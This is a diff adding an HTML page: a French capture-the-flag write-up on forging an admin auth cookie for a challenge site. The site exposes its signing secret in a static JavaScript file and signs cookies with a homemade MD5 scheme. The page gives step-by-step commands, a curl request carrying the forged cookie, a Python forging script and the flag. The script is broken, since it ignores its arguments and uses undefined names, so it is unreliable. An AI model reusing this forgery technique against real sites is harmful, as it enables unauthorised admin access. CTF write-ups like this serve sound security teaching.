@@ -1,0 +1,113 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Write-up — DHS Locker Room (auth cookie exploit)</title>
+  <style>
+    :root{--bg:#0f1724;--card:#0b1220;--accent:#7c3aed;--muted:#9aa4b2;--text:#e6eef6}
+    body{font-family:Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial; background:linear-gradient(180deg,#071027 0%, #081226 100%); color:var(--text);padding:32px}
+    .container{max-width:980px;margin:0 auto}
+    header{display:flex;align-items:center;gap:16px}
+    h1{font-size:28px;margin:0}
+    .meta{color:var(--muted);font-size:14px}
+    .card{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.03);padding:22px;border-radius:12px;margin-top:18px}
+    pre{background:#031427;padding:12px;border-radius:8px;overflow:auto;color:#d8eefe}
+    code{background:rgba(255,255,255,0.02);padding:2px 6px;border-radius:6px}
+    img.illus{max-width:100%;border-radius:8px;display:block;margin:12px 0}
+    .center{text-align:center}
+    .actions{display:flex;gap:8px;margin-top:12px}
+    a.btn{display:inline-block;padding:8px 12px;border-radius:8px;text-decoration:none;background:var(--accent);color:white}
+    footer{color:var(--muted);font-size:13px;margin-top:20px}
+    table{width:100%;border-collapse:collapse;margin-top:12px}
+    th,td{padding:8px;border-bottom:1px solid rgba(255,255,255,0.03);text-align:left}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <div>
+        <h1>Write-up — DHS Locker Room (auth cookie exploit)</h1>
+        <div class="meta">Target: <code>dhs-locker-room.chals.io</code> — Utilisateur utilisé pour l'exemple : <strong>user_test</strong></div>
+      </div>
+    </header>
+    <div class="card">
+      <figure>
+        <img class="illus" src="1.png" alt="challenge" />
+        <figcaption class="center">Le challenge ici présent nous présente un site de gestion des vestiaires pour la CAN dont l'espace est vulnérable</figcaption>
+      </figure>
+      
+      <figure>
+        <img class="illus" src="2.png" alt="challenge" />
+        <figcaption class="center">Le challenge ici présent nous présente un site de gestion des vestiaires pour la CAN dont l'espace est vulnérable</figcaption>
+      </figure>
+      <figure>
+        <img class="illus" src="3.png" alt="challenge" />
+        <figcaption class="center">En essayant de se connecter avec les identifiants fictifs (user_test, 123456789), on remarque que l'utilisateur est connecté avec la mention <code>is_admin</code> à false</figcaption>
+      </figure>
+            <figure>
+        <img class="illus" src="4.png" alt="challenge" />
+        <p>En fouillant un peu le site utilisait un cookie <code>auth</code> avec deux parties : <code>&lt;payload_base64&gt;.&lt;signature_hex&gt;</code>.</p></figure>
+      <figure>
+        <img class="illus" src="7.png" alt="robots.txt" />
+        <figcaption class="center">montrant l'accès à <code>/static/app.js</code></figcaption>
+      </figure>
+
+      <figure>
+        <img class="illus" src="8.png" alt="static app.js" />
+        <figcaption class="center">En fouillant les ressources statiques, on trouve le secret exposé. <br> Contenu de <code>/static/app.js</code> exposant le secret <code>can2023!</code>La signature est calculée comme <code>md5(payload_base64 + secret)</code> — une méthode « maison » vulnérable. On peut donc forger un cookie admin.</figcaption>
+      </figure>
+      <h2>Étapes reproduisibles</h2>
+      <ol>
+        <li>Consulter <code>/robots.txt</code> et suivre la ressource autorisée <code>/static/app.js</code>.</li>
+        <li>Récupérer <code>SECRET = "can2023!"</code> dans <code>/static/app.js</code>.</li>
+        <li>Construire le payload JSON compact : <code>{"user":"user_test","is_admin":true}</code>.</li>
+        <li>Encoder le JSON en Base64 (sans saut de ligne).</li>
+        <li>Calculer la signature : <code>md5(payload_base64 + "can2023!")</code>.</li>
+        <li>Assembler le cookie : <code>&lt;payload_base64&gt;.&lt;signature_hex&gt;</code> puis l'envoyer à <code>/admin</code>.</li>
+      </ol>
+
+      <h3>Exemple</h3>
+      <pre><code><h4># encoder le payload (linux/mac)</h4>
+echo -n '{"user":"user_test","is_admin":true}' | base64  <br><br>Ce qui donne:<code>eyJ1c2VyIjoidXNlcl90ZXN0IiwiaXNfYWRtaW4iOnRydWV9</code>
+
+<br><br><br><h4># calculer la signature</h4>
+Ici ce qu'il faut faire, il faut concaténer le payload généré avec le SECRET et calculer le MD5 du résultat
+echo -n 'eyJ1c2VyIjoidXNlcl90ZXN0IiwiaXNfYWRtaW4iOnRydWV9can2023!' | md5sum  <br>
+ <br>Ce qui va donner <code>227bbe5c62c14eb00618aa2be4e8eb11</code><br><br>
+
+<br><h4># tester avec curl</h4>
+<code>curl -s -b "auth=eyJ1c2VyIjoidXNlcl90ZXN0IiwiaXNfYWRtaW4iOnRydWV9.227bbe5c62c14eb00618aa2be4e8eb11"<br> https://dhs-locker-room.chals.io/admin | grep 'DHS'</code>
+</code></pre>
+
+      <h3>Script Python (génération du cookie)</h3>
+      <pre><code>#!/usr/bin/env python3
+import json, base64, hashlib
+
+SECRET = "can2023!"
+
+def make_cookie(user, is_admin):
+    payload = {"user": user_test, "is_admin": true}
+    payload_json = json.dumps(payload, separators=(',', ':')).encode('utf-8')
+    payload_b64 = base64.b64encode(payload_json).decode('utf-8')
+    signature = hashlib.md5((payload_b64 + SECRET).encode('utf-8')).hexdigest()
+    return f"{payload_b64}.{signature}"
+
+if __name__ == '__main__':
+    cookie = make_cookie('user_test', True)
+    print('Cookie généré :', cookie)
+</code></pre>
+
+      <h2>Flag</h2>
+      <p>Après injection du cookie admin, la page <code>/admin</code> affiche :</p>
+      <figure>
+        <img class="illus" src="10.png" alt="admin page with flag" />
+        <figcaption class="center">Page <code>/admin</code> affichant le flag après forçage du cookie.</figcaption>
+      </figure>
+
+      <pre><code>DHS{locker_room_auth_ok}</code></pre>
+
+    </div>
+  </div>
+</body>
+</html>
